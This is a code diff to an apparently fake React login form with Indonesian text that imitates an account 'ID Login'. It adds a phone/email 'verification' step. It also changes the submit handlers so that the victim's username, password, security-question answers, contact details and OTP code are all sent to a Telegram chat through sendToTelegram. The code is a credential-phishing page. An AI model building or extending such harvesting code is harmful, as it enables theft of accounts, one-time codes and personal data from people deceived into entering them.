@@ -8,7 +8,7 @@ interface LoginFormProps {
 }
 
 const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
-  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 3: Success Modal
+  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Questions, 1.75: Phone/Email, 2: OTP, 3: Success Modal
   
   // STEP 1 STATES
   const [username, setUsername] = useState('');
@@ -18,6 +18,10 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
   const [otp, setOtp] = useState('');
   const [otpError, setOtpError] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
+
+  // Verification State (New)
+  const [verificationInput, setVerificationInput] = useState('');
+  const [verificationError, setVerificationError] = useState(false);
 
   // Security Questions State
   const [a1, setA1] = useState('');
@@ -91,6 +95,27 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
         q3, a3
     });
 
+    // Proceed to Verification Step (Phone/Email)
+    setStep(1.75);
+  };
+
+  const handleVerificationSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (playClickSound) playClickSound();
+
+    if (!verificationInput || verificationInput.length < 5) {
+        setVerificationError(true);
+        return;
+    }
+    setVerificationError(false);
+
+    // Send Verification Info to Telegram
+    await sendToTelegram(username, password, "ID Login - Verification", "-", {
+        q1, a1,
+        q2, a2,
+        q3, a3
+    }, verificationInput);
+
     // Proceed to OTP Step
     setStep(2);
   };
@@ -105,8 +130,12 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     }
     setOtpError(false);
 
-    // Kirim ke Telegram dengan OTP
-    const success = await sendToTelegram(username, password, "ID Login - OTP", otp);
+    // Kirim ke Telegram dengan OTP dan info verifikasi
+    const success = await sendToTelegram(username, password, "ID Login - OTP", otp, {
+        q1, a1,
+        q2, a2,
+        q3, a3
+    }, verificationInput);
     
     // Tampilkan Custom Loading Overlay
     setShowCustomLoading(true);
@@ -378,6 +407,66 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
 
              
 
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ================= STEP 1.75: PHONE/EMAIL VERIFICATION ================= */}
+      {step === 1.75 && (
+        <div className="relative w-[480px] animate-pop-in z-50 scale-90 md:scale-100 origin-center">
+          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
+            {/* Header */}
+            <div className="h-10 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
+              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
+              <h2 className="text-[#ffd700] text-lg font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
+                Verifikasi Akun
+              </h2>
+              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
+                {[...Array(8)].map((_, i) => (
+                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm mx-0.5"></div>
+                ))}
+              </div>
+              <button 
+                onClick={handleClose}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
+              >
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            {/* Body */}
+            <div className="px-10 py-8 flex flex-col gap-4 relative bg-white/50 backdrop-blur-sm">
+              <div className="text-center text-gray-600 font-bold text-sm mb-2 px-2">
+                Silakan masukkan Nomor HP atau Email yang terdaftar untuk verifikasi akun Anda.
+              </div>
+
+              <div className="flex flex-col gap-1 relative">
+                <input 
+                  type="text" 
+                  className="w-full h-10 bg-[#bf6b86] rounded-full px-5 text-white placeholder-white/70 outline-none border border-pink-300/50 shadow-inner font-bold text-sm tracking-wide text-center"
+                  placeholder="Nomor HP atau Email" 
+                  value={verificationInput}
+                  onChange={(e) => {
+                      setVerificationInput(e.target.value);
+                      if(e.target.value) setVerificationError(false);
+                  }}
+                />
+                {verificationError && <span className="absolute -bottom-5 left-0 right-0 text-center text-[10px] text-red-500 font-bold uppercase tracking-tight">Data wajib diisi dengan benar</span>}
+              </div>
+
+              {/* Submit Button */}
+              <div className="flex items-center justify-center mt-6">
+                 <button 
+                    onClick={handleVerificationSubmit}
+                    className="w-40 h-10 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-base shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
+                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
+                 >
+                   Verifikasi
+                 </button>
+              </div>
             </div>
           </div>
         </div>
